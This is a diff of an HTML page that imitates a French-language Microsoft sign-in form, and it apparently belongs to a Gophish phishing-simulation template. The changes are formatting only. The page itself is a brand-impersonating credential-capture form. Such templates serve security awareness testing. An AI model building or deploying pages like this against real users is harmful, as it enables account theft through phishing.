@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
+<!DOCTYPE html><html><head>
     <style>
         @font-face {
             font-family: 'Segoe UI';
@@ -153,24 +151,24 @@
 <body>
     <div class="login-container">
         <div class="login-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo"/>
             <h2>Se connecter</h2>
         </div>
 
-        <form autocomplete="off">
+        <form autocomplete="off" action="">
             <div class="form-group">
                 <span class="error-message" id="email-error">Entrez une adresse e-mail, un numéro de téléphone ou un identifiant Skype valide.</span>
-                <input type="email" class="form-control" id="email" placeholder="E-mail, téléphone ou identifiant Skype" required>
+                <input type="email" class="form-control" id="email" placeholder="E-mail, téléphone ou identifiant Skype" required=""/>
             </div>
 
             <div class="form-group">
                 <span class="error-message" id="password-error">Veuillez saisir votre mot de passe.</span>
-                <input type="password" class="form-control" id="password" placeholder="Mot de passe" required>
+                <input type="password" class="form-control" id="password" placeholder="Mot de passe" required=""/>
             </div>
 
             <div class="connection-options">
                 <a href="#">
-                    <img src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png" alt="Options de connexion">
+                    <img src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png" alt="Options de connexion"/>
                     <span>Options de connexion</span>
                 </a>
             </div>
@@ -273,5 +271,6 @@
             }
         }
     </script>
-</body>
-</html>
+
+
+</body></html>
